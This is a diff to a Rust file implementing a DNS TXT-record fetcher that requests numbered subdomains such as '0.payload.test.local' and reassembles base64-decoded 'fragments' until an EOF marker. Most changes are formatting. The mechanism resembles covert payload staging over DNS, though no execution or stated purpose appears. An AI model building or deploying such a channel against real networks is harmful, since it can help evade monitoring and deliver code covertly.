@@ -1,4 +1,4 @@
-use crate::fragments::{Fragment, FragmentSource};
+use crate::fragments::Fragment;
 use core::time::Duration;
 use std::net::UdpSocket;
 
@@ -22,7 +22,7 @@ impl DnsTxtSource {
         let mut out = Vec::with_capacity((b64.len() * 3) / 4);
         let mut val = 0u32;
         let mut bits = 0;
-        
+
         for &b in b64 {
             let n = match b {
                 b'A'..=b'Z' => b - b'A',
@@ -49,14 +49,14 @@ impl DnsTxtSource {
     /// Forms a raw DNS query packet for N.domain (e.g., "0.payload.test.local").
     fn build_dns_query(&self, tx_id: u16, seq: u16) -> Vec<u8> {
         let mut packet = Vec::with_capacity(512);
-        
+
         // 12-byte DNS Header
         packet.extend_from_slice(&tx_id.to_be_bytes()); // Transaction ID
-        packet.extend_from_slice(&[0x01, 0x00]);        // Flags: Standard query
-        packet.extend_from_slice(&[0x00, 0x01]);        // Questions: 1
-        packet.extend_from_slice(&[0x00, 0x00]);        // Answer RRs: 0
-        packet.extend_from_slice(&[0x00, 0x00]);        // Authority RRs: 0
-        packet.extend_from_slice(&[0x00, 0x00]);        // Additional RRs: 0
+        packet.extend_from_slice(&[0x01, 0x00]); // Flags: Standard query
+        packet.extend_from_slice(&[0x00, 0x01]); // Questions: 1
+        packet.extend_from_slice(&[0x00, 0x00]); // Answer RRs: 0
+        packet.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
+        packet.extend_from_slice(&[0x00, 0x00]); // Additional RRs: 0
 
         // Parse: "<seq>.domain.com"
         let seq_str = format!("{}", seq);
@@ -77,45 +77,66 @@ impl DnsTxtSource {
     }
 
     fn parse_dns_response(&self, buf: &[u8]) -> Option<Vec<u8>> {
-        if buf.len() < 12 { return None; }
+        if buf.len() < 12 {
+            return None;
+        }
 
         let flags = u16::from_be_bytes([buf[2], buf[3]]);
-        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 { return None; }
+        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 {
+            return None;
+        }
 
         let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
         let ancount = u16::from_be_bytes([buf[6], buf[7]]);
-        if ancount == 0 { return None; }
+        if ancount == 0 {
+            return None;
+        }
 
         let mut offset = 12;
         for _ in 0..qdcount {
             while offset < buf.len() && buf[offset] != 0 {
-                if buf[offset] >= 192 { offset += 2; break; }
-                else { offset += (buf[offset] as usize) + 1; }
+                if buf[offset] >= 192 {
+                    offset += 2;
+                    break;
+                } else {
+                    offset += (buf[offset] as usize) + 1;
+                }
             }
-            if offset < buf.len() && buf[offset] == 0 { offset += 1; }
+            if offset < buf.len() && buf[offset] == 0 {
+                offset += 1;
+            }
             offset += 4;
         }
 
         for _ in 0..ancount {
-            if offset >= buf.len() { break; }
+            if offset >= buf.len() {
+                break;
+            }
 
-            if buf[offset] >= 192 { offset += 2; }
-            else {
-                while offset < buf.len() && buf[offset] != 0 { offset += (buf[offset] as usize) + 1; }
+            if buf[offset] >= 192 {
+                offset += 2;
+            } else {
+                while offset < buf.len() && buf[offset] != 0 {
+                    offset += (buf[offset] as usize) + 1;
+                }
                 offset += 1;
             }
 
-            if offset + 10 > buf.len() { break; }
-            let rtype = u16::from_be_bytes([buf[offset], buf[offset+1]]);
-            let rdlength = u16::from_be_bytes([buf[offset+8], buf[offset+9]]) as usize;
+            if offset + 10 > buf.len() {
+                break;
+            }
+            let rtype = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
+            let rdlength = u16::from_be_bytes([buf[offset + 8], buf[offset + 9]]) as usize;
             offset += 10;
 
-            if rtype == 16 { 
-                if offset + rdlength > buf.len() { break; }
+            if rtype == 16 {
+                if offset + rdlength > buf.len() {
+                    break;
+                }
                 let txt_len = buf[offset] as usize;
                 if offset + 1 + txt_len <= buf.len() {
-                    let txt_data = &buf[offset+1 .. offset+1+txt_len];
-                    
+                    let txt_data = &buf[offset + 1..offset + 1 + txt_len];
+
                     // The magic EOF marker
                     if txt_data == b"EOF" || txt_data == b"\"EOF\"" {
                         return Some(b"EOF".to_vec());
@@ -147,15 +168,15 @@ impl DnsTxtSource {
 
         let mut buf = [0u8; 512];
         if let Ok((size, _)) = sock.recv_from(&mut buf) {
-             if let Some(payload_bytes) = self.parse_dns_response(&buf[..size]) {
-                 if payload_bytes == b"EOF" {
-                     return None; // EOF signal
-                 }
-                 return Some(Fragment {
-                     sequence_id: (seq % 256) as u8,
-                     data: payload_bytes,
-                 });
-             }
+            if let Some(payload_bytes) = self.parse_dns_response(&buf[..size]) {
+                if payload_bytes == b"EOF" {
+                    return None; // EOF signal
+                }
+                return Some(Fragment {
+                    sequence_id: seq,
+                    data: payload_bytes,
+                });
+            }
         }
         None // Timeout or error
     }
